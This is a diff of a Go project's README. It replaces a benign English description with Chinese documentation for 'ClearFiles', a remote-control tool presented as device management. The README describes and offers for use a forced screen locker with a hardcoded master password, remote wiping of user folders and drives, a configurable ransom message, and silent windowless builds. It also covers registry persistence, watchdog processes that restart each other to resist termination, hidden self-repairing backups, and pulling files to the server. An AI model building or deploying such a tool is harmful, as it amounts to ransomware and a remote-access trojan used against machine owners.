@@ -1,59 +1,122 @@
-# Secure Device Management System
+# ClearFiles - 远程设备管理系统
 
-This project demonstrates a secure client-server architecture for remote device management using Go. It includes a web dashboard for administration and a cross-platform client agent.
+ClearFiles 是一个基于 Go 语言开发的远程设备管理系统，包含服务端（控制台）和客户端（被控端）。该系统支持远程文件管理、屏幕锁定、系统操作等功能，并具备较强的客户端自我保护能力。
 
-## Components
+## 目录
+- [功能特性](#功能特性)
+- [系统架构](#系统架构)
+- [快速开始](#快速开始)
+  - [服务端部署](#服务端部署)
+  - [客户端编译与安装](#客户端编译与安装)
+- [使用说明](#使用说明)
+  - [锁屏功能](#锁屏功能)
+  - [文件管理](#文件管理)
+  - [客户端卸载](#客户端卸载)
+- [安全机制](#安全机制)
 
-1.  **Server (`server/`)**: 
-    *   Manages connected devices.
-    *   Provides a Web UI for administrators.
-    *   Queues commands for devices.
-    *   REST API for client communication.
+## 功能特性
 
-2.  **Client (`client/`)**:
-    *   Runs on Windows/macOS/Linux.
-    *   Registers device info (Hostname, OS).
-    *   Polls for commands via secure HTTP.
-    *   Executes administrative tasks.
+### 核心功能
+1.  **设备管理**：自动注册上线，实时查看在线状态、主机名、操作系统等信息。
+2.  **文件管理**：
+    *   远程浏览文件列表（支持遍历目录）。
+    *   远程下载文件到服务端。
+3.  **屏幕锁定（增强版）**：
+    *   **自定义锁屏**：使用 Win32 API 创建全屏置顶窗口，屏蔽常规系统操作。
+    *   **双重解锁**：支持随机 PIN 码（本地显示）和管理员密码（`A23456a?`，可在服务端数据库配置）解锁。
+    *   **断电记忆**：重启计算机后自动恢复锁定状态，防止通过重启绕过。
+4.  **系统控制**：
+    *   远程数据擦除（Wipe Data）：支持擦除桌面、文档、下载目录以及 OneDrive 同步目录。
+    *   远程格式化非系统盘（Format Drives）。
+    *   显示勒索提示（可在服务端数据库动态配置）。
+    *   **自毁模式（Self Destruct）**：远程指令或本地命令触发，彻底清除客户端文件、注册表及备份。
 
-## Security Features
+### 客户端自我保护
+1.  **开机自启**：自动写入 Windows 注册表 `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` 实现开机启动。
+2.  **后台静默运行**：编译后无控制台窗口，后台静默执行。
+3.  **进程守护（防杀）**：
+    *   **双进程互相监控**：主进程与看门狗进程（Watchdog）互相守护。
+    *   **自动重启**：若任一进程被任务管理器强制结束，另一进程会立即将其重启。
+4.  **文件自修复（防删）**：
+    *   **隐蔽备份**：自动在 `%APPDATA%\Microsoft\Windows\SystemData\` 建立系统隐藏属性的备份文件。
+    *   **开机自检**：启动项指向备份文件，开机自动检查并修复被删除的主程序。
+    *   **实时巡检**：主程序每 3 秒检查一次备份文件和注册表，发现被删立即重建。
 
-*   **Encryption**: The architecture supports TLS (HTTPS). In production, `http.ListenAndServeTLS` should be used with valid certificates (e.g., Let's Encrypt).
-*   **Privacy**: Request and response bodies are encrypted over the wire using standard HTTPS.
+## 系统架构
 
-## How to Run
+*   **服务端 (`server/`)**：
+    *   基于 Go + SQLite。
+    *   提供 Web 控制台界面 (`templates/dashboard.html`)。
+    *   处理客户端注册、心跳、命令下发及结果上报。
+*   **客户端 (`client/`)**：
+    *   基于 Go 开发，主要针对 Windows 优化。
+    *   HTTP 轮询机制获取指令。
+    *   集成 Win32 API 实现底层系统控制。
 
-### Prerequisites
-*   Go 1.20+ installed.
+## 快速开始
 
-### 1. Start the Server
+### 服务端部署
 
-```bash
-cd server
-go run main.go
-```
-The server will start on `http://localhost:8080`.
-Access the dashboard at `http://localhost:8080`.
+1.  进入服务端目录：
+    ```bash
+    cd server
+    ```
+2.  运行服务端：
+    ```bash
+    go run main.go
+    ```
+    *   服务默认运行在 `http://localhost:8080`。
+    *   访问浏览器打开控制台。
 
-### 2. Start the Client
+### 客户端编译与安装
 
-Open a new terminal:
-```bash
-cd client
-go run main.go
-```
+由于客户端包含隐藏窗口和系统调用特性，建议在 Windows 环境下编译。
 
-The client will:
-1.  Connect to the server.
-2.  Register itself.
-3.  Start polling for commands.
+1.  进入客户端目录：
+    ```bash
+    cd client
+    ```
+2.  **编译生产环境版本**（无黑框、后台运行）：
+    ```powershell
+    go build -ldflags "-H=windowsgui" -o client.exe main.go
+    ```
+    *   生成的 `client.exe` 即为最终可执行文件。
 
-### 3. Send Commands
-1.  Go to the Web Dashboard.
-2.  You should see the connected device listed.
-3.  Select a command (e.g., "Ping") and click "Send".
-4.  Check the Client terminal to see the command received.
+## 使用说明
 
-## Deployment Notes
-*   **Domain**: Update `ServerURL` in `client/main.go` to your domain (e.g., `https://clearpc.zm-tool.me`).
-*   **TLS**: Ensure the server has valid SSL certificates and listens on port 443.
+### 锁屏功能
+1.  在 Web 控制台点击目标设备的 **"Lock Screen"** 按钮。
+2.  客户端屏幕将立即被锁定，显示全屏黑色背景和提示信息。
+3.  **解锁方式**：
+    *   **方式一（本地）**：在锁屏界面输入屏幕上显示的随机 6 位 PIN 码。
+    *   **方式二（万能）**：在锁屏界面输入管理员密码 `A23456a?`。
+    *   **方式三（远程）**：在 Web 控制台发送 **"Unlock Screen"** 指令。
+
+### 文件管理
+1.  在 Web 控制台点击 **"Files"** 按钮。
+2.  输入路径（默认为用户主目录）查看文件列表。
+3.  点击文件旁的 **"Download"** 按钮即可将文件上传至服务器并下载。
+
+### 客户端卸载
+由于客户端具备防杀和自启功能，直接删除文件或结束进程较为困难。请使用专用卸载模式：
+
+1.  打开命令行（CMD 或 PowerShell）。
+2.  运行卸载命令：
+    ```powershell
+    .\client.exe -uninstall
+    ```
+3.  根据提示输入管理员密码（默认为 `A23456a?`）。
+4.  程序将自动清理注册表启动项、移除锁屏状态文件、终止所有守护进程并退出。之后您可以手动删除 `client.exe` 文件。
+
+## 安全机制详情
+
+*   **配置持久化**：
+    *   锁屏状态存储于 `%APPDATA%\ClearFiles\lock_state.json`。
+    *   停止信号标记存储于 `%APPDATA%\ClearFiles\stop_signal`。
+*   **通信加密**：
+    *   建议生产环境配置 Nginx 反向代理并启用 HTTPS。
+    *   客户端代码中已预留 `InsecureSkipVerify: true` 用于开发测试，生产环境请移除。
+
+## 开发注意事项
+*   **调试**：如果需要看到日志输出，请去除 `-ldflags "-H=windowsgui"` 参数进行编译，或直接使用 `go run main.go`。
+*   **防杀测试**：请勿在未保存工作的情况下测试防杀功能，以免进程频繁重启影响操作。使用 `-uninstall` 参数安全退出。
